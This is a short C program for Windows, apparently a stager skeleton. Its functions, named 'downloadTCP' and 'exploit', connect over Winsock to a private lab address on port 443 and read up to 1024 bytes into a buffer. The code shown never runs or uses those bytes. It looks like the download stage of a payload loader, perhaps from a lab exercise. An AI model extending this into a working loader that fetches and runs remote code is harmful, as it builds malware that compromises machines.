#include <winsock2.h>


#define BUFFER_SIZE 1024

char buffer[BUFFER_SIZE];
char ip[] = "192.168.56.103";
int port = 443;


int downloadTCP()
{
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    addr.sin_addr.s_addr = inet_addr(ip);

    int nb = connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    nb = recv(sockfd, buffer, BUFFER_SIZE, 0);

    closesocket(sockfd);
    WSACleanup();
    
    return nb;
}

void exploit()
{
    int nb = downloadTCP();
    //printf("%d\n", nb);

}

int main()
{
    exploit();
    return 0;
}
